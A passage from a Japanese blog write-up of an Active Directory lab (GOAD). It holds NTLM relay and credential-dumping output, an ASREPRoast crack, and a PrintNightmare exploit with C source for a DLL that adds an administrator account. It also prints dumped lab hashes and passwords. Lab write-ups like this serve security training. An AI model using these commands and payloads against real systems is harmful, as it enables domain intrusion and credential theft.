NORTH/EDDARD.STARK@192.168.56.23(445) to active SOCKS connection. Enjoy [*] SMBD-Thread-13 (process_request_thread): Connection from NORTH/EDDARD.STARK@192.168.56.11 controlled, attacking target smb://192.168.56.22 [*] Authenticating against smb://192.168.56.22 as NORTH/EDDARD.STARK SUCCEED [*] SOCKS: Adding NORTH/EDDARD.STARK@192.168.56.22(445) to active SOCKS connection. Enjoy [*] SMBD-Thread-13 (process_request_thread): Connection from NORTH/EDDARD.STARK@192.168.56.11 controlled, but there are no more targets left! [*] Received connection from NORTH/eddard.stark at WINTERFELL, connection will be relayed after re-authentication [*] Received connection from NORTH/eddard.stark at WINTERFELL, connection will be relayed after re-authentication [*] SMBD-Thread-14 (process_request_thread): Connection from NORTH/EDDARD.STARK@192.168.56.11 controlled, but there are no more targets left! [*] Received connection from NORTH/eddard.stark at WINTERFELL, connection will be relayed after re-authentication [*] Received connection from NORTH/robb.stark at WINTERFELL, connection will be relayed after re-authentication [*] SMBD-Thread-15 (process_request_thread): Connection from NORTH/ROBB.STARK@192.168.56.11 controlled, attacking target smb://192.168.56.23 [*] Authenticating against smb://192.168.56.23 as NORTH/ROBB.STARK SUCCEED [*] SOCKS: Adding NORTH/ROBB.STARK@192.168.56.23(445) to active SOCKS connection. Enjoy [*] SMBD-Thread-15 (process_request_thread): Connection from NORTH/ROBB.STARK@192.168.56.11 controlled, attacking target smb://192.168.56.22 [*] Authenticating against smb://192.168.56.22 as NORTH/ROBB.STARK SUCCEED [*] SOCKS: Adding NORTH/ROBB.STARK@192.168.56.22(445) to active SOCKS connection. Enjoy [*] SMBD-Thread-15 (process_request_thread): Connection from NORTH/ROBB.STARK@192.168.56.11 controlled, but there are no more targets left! [*] Received connection from NORTH/robb.stark at WINTERFELL, connection will be relayed after re-authentication [*] Received connection from NORTH/robb.stark at WINTERFELL, connection will be relayed after re-authentication [*] SMBD-Thread-16 (process_request_thread): Connection from NORTH/ROBB.STARK@192.168.56.11 controlled, but there are no more targets left! [*] Received connection from NORTH/robb.stark at WINTERFELL, connection will be relayed after re-authentication というわけで中間者攻撃しつつsocksプロキシを使えるようになった\nそれでもってproxychainsで繋ぎつつsecretsdumpを走らせる\n┌──(kali㉿kali)-[~/goad] └─$ proxychains impacket-secretsdump -no-pass 'NORTH'/'EDDARD.STARK'@'192.168.56.22' [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.17 [proxychains] DLL init: proxychains-ng 4.17 [proxychains] DLL init: proxychains-ng 4.17 Impacket v0.12.0.dev1 - Copyright 2023 Fortra [proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.56.22:445 ... OK [*] Service RemoteRegistry is in stopped state [*] Starting service RemoteRegistry [*] Target system bootKey: 0xe726c3449239522103313bbfa17ae832 [*] Dumping local SAM hashes (uid:rid:lmhash:nthash) Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4363b6dc0c95588964884d7e1dfea1f7::: vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b::: [*] Dumping cached domain logon information (domain/username:hash) NORTH.SEVENKINGDOMS.LOCAL/sql_svc:$DCC2$10240#sql_svc#89e701ebbd305e4f5380c5150494584a: (2024-08-11 04:00:35) NORTH.SEVENKINGDOMS.LOCAL/robb.stark:$DCC2$10240#robb.stark#f19bfb9b10ba923f2e28b733e5dd1405: (2024-10-13 02:15:32) [*] Dumping LSA Secrets [*] $MACHINE.ACC NORTH\\CASTELBLACK$:aes256-cts-hmac-sha1-96:7f588d89c8e329850eb2cfcb6f20dcc68346a58b33748b8ba3762f365bfd3857 NORTH\\CASTELBLACK$:aes128-cts-hmac-sha1-96:7171432588c012604326db931b606ad9 NORTH\\CASTELBLACK$:des-cbc-md5:08f707b33d52a2b6 NORTH\\CASTELBLACK$:plain_password_hex:1111806e0bf8db391cb1c02c6411c34bce4b042253b862a6baa74e0a7654780999ff01c1d53d598ed08f168c35ca13303583a23343a965fa4b8f72afdfb63371b8f3d6aeb45d7e1e3c3f91d4f1eea5977a41030a4e83603b6c4d78db03728bc79b041b02fc53943f14ce014ed7fa7c335c7e150467b8dba0023256d6f376150c45c7bde0635e2d1ed53848685f8addd100827f320d24d0ca9102a6ca7824ecc7994f0ed433c325a7e72d20960ce3797570272218fbfb8868fba0037ace07459c34eb05cf05c00b9a78082676e45a1283da88772cb7881a96312998f49b2b92a4575a46be4a2d839a0efd7d6f5d0b30f0 NORTH\\CASTELBLACK$:aad3b435b51404eeaad3b435b51404ee:20425334e9f78d883485696487ab1b67::: [*] DPAPI_SYSTEM dpapi_machinekey:0x130872a1a24387df59aae05e7d4ca0c98dd5535d dpapi_userkey:0x86a53690af0fcd4490280ede099bc684e11a6918 [*] NL$KM 0000 22 34 01 76 01 70 30 93 88 A7 6B B2 87 43 59 69 \"4.v.p0...k..CYi 0010 0E 41 BD 22 0A 0C CC 23 3A 5B B6 74 CB 90 D6 35 .A.\"...#:[.t...5 0020 14 CA D8 45 4A F0 DB 72 D5 CF 3B A1 ED 7F 3A 98 ...EJ..r..;...:. 0030 CD 4D D6 36 6A 35 24 2D A0 EB 0F 8E 3F 52 81 C9 .M.6j5$-....?R.. NL$KM:223401760170309388a76bb2874359690e41bd220a0ccc233a5bb674cb90d63514cad8454af0db72d5cf3ba1ed7f3a98cd4dd6366a35242da0eb0f8e3f5281c9 [*] _SC_MSSQL$SQLEXPRESS north.sevenkingdoms.local\\sql_svc:YouWillNotKerboroast1ngMeeeeee [*] Cleaning up... [*] Stopping service RemoteRegistry 続いてはlsassyを使ってLSASSの情報を取得してみる\nhttps://github.com/login-securite/lsassy\n┌──(kali㉿kali)-[~/goad] └─$ proxychains lsassy --no-pass -d NORTH -u EDDARD.STARK 192.168.56.22 [proxychains] config file found: /etc/proxychains4.conf [proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4 [proxychains] DLL init: proxychains-ng 4.17 [proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.56.22:445 ... OK [+] 192.168.56.22 Authentication successful [proxychains] Strict chain ... 127.0.0.1:1080 ... 192.168.56.22:445 ... OK [+] 192.168.56.22 Lsass dumped in C:\\Windows\\Temp\\6HGg19bP.jpg (51439491 Bytes) [+] 192.168.56.22 Lsass dump deleted [+] 192.168.56.22 NORTH\\robb.stark [NT] 831486ac7f26860c9e2f51ac91e1a07a | [SHA1] 3bea28f1c440eed7be7d423cefebb50322ed7b6c [+] 192.168.56.22 NORTH\\CASTELBLACK$ [NT] 20425334e9f78d883485696487ab1b67 | [SHA1] 8f582df44ed1c9e9c9d26be730c0b99226271cf4 [+] 192.168.56.22 north.sevenkingdoms.local\\CASTELBLACK$ [PWD] 1111806e0bf8db391cb1c02c6411c34bce4b042253b862a6baa74e0a7654780999ff01c1d53d598ed08f168c35ca13303583a23343a965fa4b8f72afdfb63371b8f3d6aeb45d7e1e3c3f91d4f1eea5977a41030a4e83603b6c4d78db03728bc79b041b02fc53943f14ce014ed7fa7c335c7e150467b8dba0023256d6f376150c45c7bde0635e2d1ed53848685f8addd100827f320d24d0ca9102a6ca7824ecc7994f0ed433c325a7e72d20960ce3797570272218fbfb8868fba0037ace07459c34eb05cf05c00b9a78082676e45a1283da88772cb7881a96312998f49b2b92a4575a46be4a2d839a0efd7d6f5d0b30f0 [+] 192.168.56.22 NORTH\\sql_svc [NT] 84a5092f53390ea48d660be52b93b804 | [SHA1] 9fd961155e28b1c6f9b3859f32f4779ad6a06404 [+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\\robb.stark [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-10-13 12:15 (TGT_NORTH.SEVENKINGDOMS.LOCAL_robb.stark_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_d9e9f780.kirbi) [+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\\robb.stark [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-10-13 12:15 (TGT_NORTH.SEVENKINGDOMS.LOCAL_robb.stark_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_5fb85f38.kirbi) [+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\\sql_svc [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-10-13 12:15 (TGT_NORTH.SEVENKINGDOMS.LOCAL_sql_svc_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_1ac82095.kirbi) [+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\\CASTELBLACK$ [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-10-13 12:15 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_e55cd434.kirbi) [+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\\CASTELBLACK$ [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-10-13 12:15 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_c9464f19.kirbi) [+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\\CASTELBLACK$ [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-10-13 12:15 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_63039232.kirbi) [+] 192.168.56.22 NORTH.SEVENKINGDOMS.LOCAL\\CASTELBLACK$ [TGT] Domain: NORTH.SEVENKINGDOMS.LOCAL - End time: 2024-10-13 12:15 (TGT_NORTH.SEVENKINGDOMS.LOCAL_CASTELBLACK$_krbtgt_NORTH.SEVENKINGDOMS.LOCAL_dd82f6bc.kirbi) [+] 192.168.56.22 18 Kerberos tickets written to /home/kali/.config/lsassy/tickets [+] 192.168.56.22 5 masterkeys saved to /home/kali/.config/lsassy/masterkeys.txt とwinterfellのAdministrator権限は取得できた\nbraavos bloodhoundでASREPRoastが可能なユーザーを見たところ、ESOSS.LOCAL/MISSANDEIが見つかった。\nASREPRoastを仕掛けてみる。\n┌──(kali㉿kali)-[~] └─$ nxc ldap 192.168.56.23 -u missandei -p '' --asreproast asreproast.hash SMB 192.168.56.23 445 BRAAVOS [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True) LDAP 192.168.56.23 445 BRAAVOS $krb5asrep$23$missandei@ESSOS.LOCAL:dcdfca025e409115dac3015ad2bdad49$8d5164d380201364641c6765135d0f1f396f15de39d107f3a23685f1b6aaacd52c765146c336f31d9e33d59d614cfc1c05e0bc2bd414dcdee30acf84fef1d469d411ecadb1ef16ba740692505fb983c5d335bd8d3c120f28f3476ef566a517629863f24e68cd0d56ce56bd0b617b1bacaeb375d4b06a726809f6fef115cf8eecd0337611e4259618593628c5058b5d86e9b994b555340086d4f72c57f9954dfd159e8e071d415b2e8bf9e85a3990e300b7253d3f0673c2e317f549dada4fc4b80c6f298f9bc296f1fb077ddcf7aa31e9592b98bd7f11c572d0132b4fc8b38ce5543ba9415b28bc163e42 johnにかける\n┌──(kali㉿kali)-[~/goad/braavos] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt asreproast.hash Using default input encoding: UTF-8 Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]) Will run 4 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status fr3edom ($krb5asrep$23$missandei@ESSOS.LOCAL) 1g 0:00:00:01 DONE (2024-10-19 16:58) 0.8333g/s 1496Kp/s 1496Kc/s 1496KC/s franciene..found9tion Use the \"--show\" option to display all of the cracked passwords reliably Session completed. missandei/fr3edom という認証情報を手に入れた\n共有されているSMBの内容を見てみる\n┌──(kali㉿kali)-[~/goad/braavos] └─$ nxc smb braavos -u missandei -p fr3edom -k --shares SMB braavos 445 BRAAVOS [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True) SMB braavos 445 BRAAVOS [+] essos.local\\missandei:fr3edom SMB braavos 445 BRAAVOS [*] Enumerated shares SMB braavos 445 BRAAVOS Share Permissions Remark SMB braavos 445 BRAAVOS ----- ----------- ------ SMB braavos 445 BRAAVOS ADMIN$ Remote Admin SMB braavos 445 BRAAVOS all READ,WRITE Basic RW share for all SMB braavos 445 BRAAVOS C$ Default share SMB braavos 445 BRAAVOS CertEnroll READ Active Directory Certificate Services share SMB braavos 445 BRAAVOS IPC$ Remote IPC SMB braavos 445 BRAAVOS public READ,WRITE Basic Read share for all domain users impacket-smbclientで見てみるとADCSのファイルを読み込めそう\n┌──(kali㉿kali)-[~/goad/braavos] └─$ impacket-smbclient -k -no-pass @braavos.essos.local Impacket v0.12.0.dev1 - Copyright 2023 Fortra Type help for list of commands # ls [-] No share selected # shares ADMIN$ all C$ CertEnroll IPC$ public # use all # ls drw-rw-rw- 0 Sun Oct 20 01:17:14 2024 . drw-rw-rw- 0 Sun Oct 20 01:17:14 2024 .. # cd .. # ls drw-rw-rw- 0 Sun Oct 20 01:17:14 2024 . drw-rw-rw- 0 Sun Oct 20 01:17:14 2024 .. # use public # ls drw-rw-rw- 0 Sun Oct 20 01:17:14 2024 . drw-rw-rw- 0 Sun Oct 20 01:17:14 2024 .. # use CertEnroll # ls drw-rw-rw- 0 Fri Oct 18 21:33:44 2024 . drw-rw-rw- 0 Fri Oct 18 21:33:44 2024 .. -rw-rw-rw- 865 Sat Aug 10 23:47:50 2024 braavos.essos.local_ESSOS-CA.crt -rw-rw-rw- 716 Fri Oct 18 21:33:44 2024 ESSOS-CA+.crl -rw-rw-rw- 902 Sat Oct 12 22:15:56 2024 ESSOS-CA.crl -rw-rw-rw- 320 Sat Aug 10 23:47:52 2024 nsrev_ESSOS-CA.asp # exit missandeiはkhal.dragoというユーザに対してGenericAllの権限を持っている。\nそこでkhal.drogoのパスワードを変更する。\n使用するツールはldap_shell\nhttps://github.com/PShlyundin/ldap_shell\n┌──(kali㉿kali)-[~/goad/braavos] └─$ ldap_shell essos.local/missandei -dc-host essos.local Password: [INFO] Starting interactive shell missandei# missandei# change_password khal.drogo horse [INFO] Got User DN: CN=khal.drogo,CN=Users,DC=essos,DC=local [INFO] Attempting to set new password of: horse [INFO] Password changed successfully! というわけで khal.drogo/horse というクレデンシャルをゲット。\n試しに確認するとちゃんと認証情報を取得できていることがわかる\n┌──(kali㉿kali)-[~/goad/braavos] └─$ nxc smb braavos -u khal.drogo -p horse SMB 192.168.56.23 445 BRAAVOS [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True) SMB 192.168.56.23 445 BRAAVOS [+] essos.local\\khal.drogo:horse (Pwn3d!) winrmも認証通りそうですね\n┌──(kali㉿kali)-[~/goad/braavos] └─$ nxc winrm braavos -u khal.drogo -p horse WINRM 192.168.56.23 5985 BRAAVOS [*] Windows 10 / Server 2016 Build 14393 (name:BRAAVOS) (domain:essos.local) WINRM 192.168.56.23 5985 BRAAVOS [+] essos.local\\khal.drogo:horse (Pwn3d!) とりあえずevil-winrmで足がかりはできた\n┌──(kali㉿kali)-[~/goad/braavos] └─$ evil-winrm -u khal.drogo -p horse -i braavos Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\khal.drogo\\Documents\u003e Printnightmareが刺さるか調査\n┌──(kali㉿kali)-[~] └─$ netexec --version 1.3.0 - NeedForSpeed - Kali Linux ┌──(kali㉿kali)-[~] └─$ nxc smb 192.168.56.10-23 -M spooler /usr/lib/python3/dist-packages/masky/core.py:102: SyntaxWarning: invalid escape sequence '\\{' f\"Start processing PFX of the user '{user_data.domain}\\{user_data.name}'\" /usr/lib/python3/dist-packages/masky/core.py:106: SyntaxWarning: invalid escape sequence '\\{' f\"Fail to process gathered certificate related to the user '{user_data.domain}\\{user_data.name}'\" /usr/lib/python3/dist-packages/masky/core.py:110: SyntaxWarning: invalid escape sequence '\\{' f\"End processing PFX of the user '{user_data.domain}\\{user_data.name}'\" /usr/lib/python3/dist-packages/masky/lib/smb.py:85: SyntaxWarning: invalid escape sequence '\\{' err_msg = f\"The user {self.__domain}\\{self.__username} is not local administrator on this system\" /usr/lib/python3/dist-packages/masky/lib/smb.py:88: SyntaxWarning: invalid escape sequence '\\{' err_msg = f\"The provided credentials for the user '{self.__domain}\\{self.__username}' are invalids or the user does not exist\" /usr/lib/python3/dist-packages/masky/lib/smb.py:257: SyntaxWarning: invalid escape sequence '\\p' np_bind = f\"ncacn_np:{target_host}[\\pipe\\svcctl]\" /usr/lib/python3/dist-packages/masky/lib/cert/auth.py:413: SyntaxWarning: invalid escape sequence '\\{' f\"Gathered NT hash for the user '{domain}\\{username}': {nt_hash}\" /usr/lib/python3/dist-packages/pypykatz/_version.py:11: SyntaxWarning: invalid escape sequence '\\.' \"\"\" SMB 192.168.56.12 445 MEEREEN [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True) SMB 192.168.56.10 445 KINGSLANDING [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False) SMB 192.168.56.11 445 WINTERFELL [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False) SMB 192.168.56.22 445 CASTELBLACK [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False) SMB 192.168.56.23 445 BRAAVOS [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True) SPOOLER 192.168.56.12 445 MEEREEN Spooler service enabled SPOOLER 192.168.56.22 445 CASTELBLACK Spooler service enabled SPOOLER 192.168.56.11 445 WINTERFELL Spooler service enabled SPOOLER 192.168.56.10 445 KINGSLANDING Spooler service enabled SPOOLER 192.168.56.23 445 BRAAVOS Spooler service enabled Running nxc against 14 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00 次のようなCのコードでdllを作成し実行する\n#include \u003cwindows.h\u003e int RunCMD() { system(\"net users pnightmare Passw0rd123. /add\"); system(\"net localgroup administrators pnightmare /add\"); return 0; } BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved ) { switch (ul_reason_for_call) { case DLL_PROCESS_ATTACH: RunCMD(); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; } return TRUE; } コンパイル\nx86_64-w64-mingw32-gcc -shared -o nightmare.dll nightmare.c PrintNightmareのコードをクローン\ngit clone https://github.com/cube0x0/CVE-2021-1675 printnightmare SMBでdllを公開しておく\nsmbserver.py -smb2support ATTACKERSHARE . で実行\n┌──(kali㉿kali)-[~/goad/printnightmare/printnightmare] └─$ python3 CVE-2021-1675.py essos.local/khal.drogo:horse@meereen.essos.local '\\\\192.168.56.104\\ATTACKSHARE\\nightmare.dll' [*] Connecting to ncacn_np:meereen.essos.local[\\PIPE\\spoolss] [+] Bind OK [+] pDriverPath Found C:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_e233a12d01c18082\\Amd64\\UNIDRV.DLL [*] Executing \\??\\UNC\\192.168.56.104\\ATTACKSHARE\\nightmare.dll [*] Try 1... [*] Stage0: 0 [*] Try 2... [*] Stage0: 0 [*] Stage2: 0 [+] Exploit Completed pnightmare/Passw0rd123. をゲット\nevil-winrmで侵入すると実行できたことがわかる\n┌──(kali㉿kali)-[~/goad/printnightmare/printnightmare] └─$ evil-winrm -u pnightmare -p Passw0rd123. -i meereen Evil-WinRM shell v3.5 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\pnightmare\\Documents\u003e whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ========================================= ================================================================== ======= SeIncreaseQuotaPrivilege Adjust memory quotas for a process Enabled SeMachineAccountPrivilege Add workstations to domain Enabled SeSecurityPrivilege Manage auditing and security log Enabled SeTakeOwnershipPrivilege Take ownership of files or other objects Enabled SeLoadDriverPrivilege Load and unload device drivers Enabled SeSystemProfilePrivilege Profile system performance Enabled SeSystemtimePrivilege Change the system time Enabled SeProfileSingleProcessPrivilege Profile single process Enabled SeIncreaseBasePriorityPrivilege Increase scheduling priority Enabled SeCreatePagefilePrivilege Create a pagefile Enabled SeBackupPrivilege Back up files and directories Enabled SeRestorePrivilege Restore files and directories Enabled SeShutdownPrivilege Shut down the system Enabled SeDebugPrivilege Debug programs Enabled SeSystemEnvironmentPrivilege Modify firmware environment values Enabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system Enabled SeUndockPrivilege Remove computer from docking station Enabled SeEnableDelegationPrivilege Enable computer and user accounts to be trusted for delegation Enabled SeManageVolumePrivilege Perform volume maintenance tasks Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Enabled SeTimeZonePrivilege Change the time zone Enabled SeCreateSymbolicLinkPrivilege Create symbolic links Enabled SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled *Evil-WinRM* PS C:\\Users\\pnightmare\\Documents\u003e というわけでNTLMハッシュをいただく\n┌──(kali㉿kali)-[~/goad/printnightmare/printnightmare] └─$ nxc smb meereen.essos.local -u pnightmare -p Passw0rd123. --ntds [!] Dumping the ntds can crash the DC on Windows Server 2019. Use the option --user \u003cuser\u003e to dump a specific user safely or the module -M ntdsutil [Y/n] SMB 192.168.56.12 445 MEEREEN [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True) SMB 192.168.56.12 445 MEEREEN [+] essos.local\\pnightmare:Passw0rd123. (Pwn3d!) SMB 192.168.56.12 445 MEEREEN [+] Dumping the NTDS, this could take a while so go grab a redbull... SMB 192.168.56.12 445 MEEREEN Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da::: SMB 192.168.56.12 445 MEEREEN Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB 192.168.56.12 445 MEEREEN krbtgt:502:aad3b435b51404eeaad3b435b51404ee:54798535f08dafb2f3ab805bb312961d::: SMB 192.168.56.12 445 MEEREEN DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: SMB 192.168.56.12 445 MEEREEN vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b::: SMB 192.168.56.12 445 MEEREEN daenerys.targaryen:1112:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a::: SMB 192.168.56.12 445 MEEREEN viserys.targaryen:1113:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097::: SMB 192.168.56.12 445 MEEREEN khal.drogo:1114:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021::: SMB 192.168.56.12 445 MEEREEN jorah.mormont:1115:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611::: SMB 192.168.56.12 445 MEEREEN missandei:1116:aad3b435b51404eeaad3b435b51404ee:1b4fd18edf477048c7a7c32fda251cec::: SMB 192.168.56.12 445 MEEREEN drogon:1117:aad3b435b51404eeaad3b435b51404ee:195e021e4c0ae619f612fb16c5706bb6::: SMB 192.168.56.12 445 MEEREEN sql_svc:1118:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804::: SMB 192.168.56.12 445 MEEREEN pnightmare:1121:aad3b435b51404eeaad3b435b51404ee:58cf12d7448ca3ea7da502c83ee6a31e::: SMB 192.168.56.12 445 MEEREEN MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:f05997d79fa50e0346a4d593d8eb1741::: SMB 192.168.56.12 445 MEEREEN BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:0d8d114e49ff85a35b3c97208d88dcf3::: SMB 192.168.56.12 445 MEEREEN gmsaDragon$:1119:aad3b435b51404eeaad3b435b51404ee:563b455a419089dfbfa829cab9f2b174::: SMB 192.168.56.12 445 MEEREEN removemiccomputer$:1120:aad3b435b51404eeaad3b435b51404ee:1e986d18a9b7c9543e2d57944e8656b7::: SMB 192.168.56.12 445 MEEREEN SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:743ab45cdf64d2f368f501fd348ab3d8::: SMB 192.168.56.12 445 MEEREEN [+] Dumped 18 NTDS hashes to /home/kali/.nxc/logs/MEEREEN_192.168.56.12_2024-10-20_143124.ntds of which 13 were added to the database SMB 192.168.56.12 445 MEEREEN [*] To extract only enabled accounts from the output file, run the following command: SMB 192.168.56.12 445 MEEREEN [*] cat /home/kali/.nxc/logs/MEEREEN_192.168.56.12_2024-10-20_143124.ntds | grep -iv disabled | cut -d ':' -f1 SMB 192.168.56.12 445 MEEREEN [*] grep -iv disabled /home/kali/.nxc/logs/MEEREEN_192.168.56.12_2024-10-20_143124.ntds | cut -d ':' -f1 Administratorグループの権限を得ているがついでなのでAdministratorのパスワードを変更して入る\n┌──(kali㉿kali)-[~/goad/printnightmare/printnightmare] └─$ ldap_shell essos.local/pnightmare -dc-host essos.local Password: \\[INFO] Starting interactive shell pnightmare# pnightmare# change_password Administrator P@ssw0rd! [INFO] Sending StartTLS command... [INFO] StartTLS succeded! [INFO] Got User DN: CN=Administrator,CN=Users,DC=essos,DC=local [INFO] Attempting to set new password of: P@ssw0rd! [INFO] Password changed successfully! Administrator/P@ssw0rd! をゲット\n┌──(kali㉿kali)-[~/goad/printnightmare/printnightmare] └─$ nxc smb meereen.essos.local -u Administrator -p P@ssw0rd! SMB 192.168.56.12 445 MEEREEN [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True) SMB 192.168.56.12 445 MEEREEN [+] essos.local\\Administrator:P@ssw0rd! (Pwn3d!) ","wordCount":"2725","inLanguage":"en","image":"https://famasoon.github.io/static/famasoon.jpg","datePublished":"2024-10-20T00:00:00Z","dateModified":"2024-10-20T00:00:00Z","author":{"@type":"Person","name":"FAMASoon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://famasoon.github.io/posts/goad_writeupch2/"},"publisher":{"@type":"Organization","name":"x64.moe","logo":{"@type":"ImageObject","url":"https://famasoon.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://famasoon.github.io/ accesskey=h title="Home (Alt + H)">Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://famasoon.github.io/categories/ title=categories><span>categories</span></a></li><li><a href=https://famasoon.github.io/tags/ title=tags><span>tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://famasoon.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://famasoon.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">GOAD Writeup Ch2</h1><div class=post-meta><span title='2024-10-20 00:00:00 +0000 UTC'>October 20, 2024</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;2725 words&nbsp;·&nbsp;FAMASoon&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/GOAD_writeupch2.md rel="noopener noreferrer" target=_blank>Suggest 